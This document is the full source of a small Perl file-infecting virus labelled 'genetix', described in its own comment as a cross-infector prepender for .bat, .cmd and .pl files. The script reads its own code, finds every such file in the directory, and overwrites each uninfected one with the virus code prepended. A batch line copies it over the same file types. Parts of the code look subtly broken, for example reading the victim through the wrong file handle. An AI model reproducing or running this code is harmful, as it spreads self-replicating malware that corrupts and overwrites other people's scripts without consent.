#genetix

#*.bat *.cmd *.pl crossinfector prepender

$TheCode = __FILE__;
$batpart = "
for %%a in (*.bat *.cmd *.pl) do copy %0 %%a
";

my @Vcode = ();
open(Host, $TheCode);
@Vcode = <Host>;
while(<Host>) {
  $. > 36 ? last : push @Vcode,$_;
}
close(Host);

while (<*.bat *.cmd *.pl>) {
$Victim = $_;
     
     my @VicCode = ();
     open(Target, $Victim);
     @VicCode = <Host>;
     while(<Target>) {
       $. > 36 ? last : push @VicCode,$_;
     }
     close(Target);

     if (@VicCode[1] !~ "#genetix") {
     open(Target, ">$Victim");
     print Target @Vcode,@VicCode;
     close(Target);

    }
}